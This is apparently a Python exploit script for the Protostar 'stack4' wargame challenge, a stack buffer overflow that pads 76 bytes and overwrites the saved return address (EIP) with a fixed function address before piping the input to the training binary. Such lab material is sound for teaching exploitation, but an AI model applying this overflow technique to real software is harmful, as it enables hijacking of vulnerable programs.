#!/usr/bin/python

import os
import struct

payload =  "A" * 76

# WRITE EIP
payload += struct.pack("I", 0x080483f4)


os.system("echo \"%s\" | /opt/protostar/bin/stack4" % payload)
